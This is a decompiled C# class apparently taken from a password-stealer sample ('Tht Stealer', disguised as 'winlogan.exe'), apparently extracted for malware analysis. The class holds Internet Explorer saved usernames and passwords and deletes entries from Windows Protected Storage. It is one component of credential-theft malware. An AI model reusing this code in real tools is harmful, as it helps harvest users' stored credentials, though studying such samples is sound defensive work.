// Decompiled with JetBrains decompiler
// Type: CIEPassword
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using System;

internal class CIEPassword
{
  private readonly Guid guidIE;
  private CProtectStore m_IPStore;
  private string m_szResourceName;
  private string m_szUserName;
  private string m_szPassword;
  private DateTime m_dtAddDate;
  private int m_dwType;

  public string ResourceName
  {
    get
    {
      return this.m_szResourceName;
    }
  }

  public string UserName
  {
    get
    {
      return this.m_szUserName;
    }
  }

  public string Password
  {
    get
    {
      return this.m_szPassword;
    }
  }

  public DateTime AddDate
  {
    get
    {
      return this.m_dtAddDate;
    }
  }

  public int PasswdType
  {
    get
    {
      return this.m_dwType;
    }
  }

  internal CIEPassword(CProtectStore PStore, string szResourceName, string szUserName, string szPasswd, DateTime dtAddDate, int dwType)
  {
    this.guidIE = new Guid("{E161255A-37C3-11D2-BCAA-00C04FD929DB}");
    if (this.m_IPStore == null)
      this.m_IPStore = PStore;
    this.m_dtAddDate = dtAddDate;
    this.m_dwType = dwType;
    this.m_szPassword = szPasswd;
    this.m_szResourceName = szResourceName;
    this.m_szUserName = szUserName;
  }

  public void DeletePassword()
  {
    this.m_IPStore.DeleteItem(this.guidIE, this.guidIE, this.m_szResourceName + ":StringData");
    this.m_IPStore.DeleteItem(this.guidIE, this.guidIE, this.m_szResourceName + ":StringIndex");
  }
}
